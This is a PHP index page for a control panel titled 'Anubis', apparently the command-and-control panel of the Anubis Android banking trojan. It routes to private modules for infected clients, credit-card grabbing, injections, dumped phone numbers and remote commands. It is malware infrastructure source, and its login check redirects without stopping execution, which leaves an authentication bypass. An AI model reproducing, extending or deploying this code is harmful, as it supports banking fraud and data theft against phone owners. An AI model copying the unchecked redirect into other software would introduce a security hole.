<html>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<?php session_start(); header('Content-type: text/html; charset=utf-8');?>

<head >
<title>Anubis</title>

<link href="styles/menu.css" rel="stylesheet"/>
<link href="styles/index.css" rel="stylesheet"/>
<link href="styles/btn.css" rel="stylesheet"/>
<link href="styles/modul_form.css" rel="stylesheet"/>
<link rel="stylesheet" href="styles/style.css"/>
<link href="styles/modul_form_log.css" rel="stylesheet"/>
<link href="styles/modul_form_set.css" rel="stylesheet"/>
<script type="text/javascript" src="js/jquery.js"></script>
<link rel="shortcut icon" href="/images/icon3.png" type="image/png"/>

<script src="js/jquery-2.1.4.min.js"></script>
<script src="js/jquery.spincrement.js"></script>
<script src="js/custom.js"></script>
<script src="js/footable.js"></script>
<script src="js/footable.min.js"></script>
</head>

 <body bgcolor="1D1F24">
<?php

//Запуск сессий;

//если пользователь не авторизован

if (!(isset($_SESSION['Name'])))
{
	//идем на страницу авторизации
	header("Location: /login.php");
//	exit;
}
?>

<?php include_once "header.php"?>
<?php

$id = $_GET['cont'];
	if($id=="kliets")
	{include_once "private/kliets.php";
	}elseif($id=="statistic")
	{include_once "private/statistic.php";
	}elseif($id=="grabingcc")
	{include_once "private/grabingcc.php";		
	}elseif($id=="injections")
	{include_once "private/injections.php";		
	}elseif($id=="maps")
	{include_once "private/maps.php";
	}elseif($id=="dump_numbers")
	{include_once "private/dump_numbers.php";
	}elseif($id=="commands")
	{include_once "private/commands.php";
	}elseif($id=="exit")
	{
		session_destroy();
		header('Location: /');
		exit;
	}else
	{header("Location:?cont=kliets&page=1");}
	if($id == null)
	{header("Location:?cont=kliets&page=1");}
?>
</body>
</html>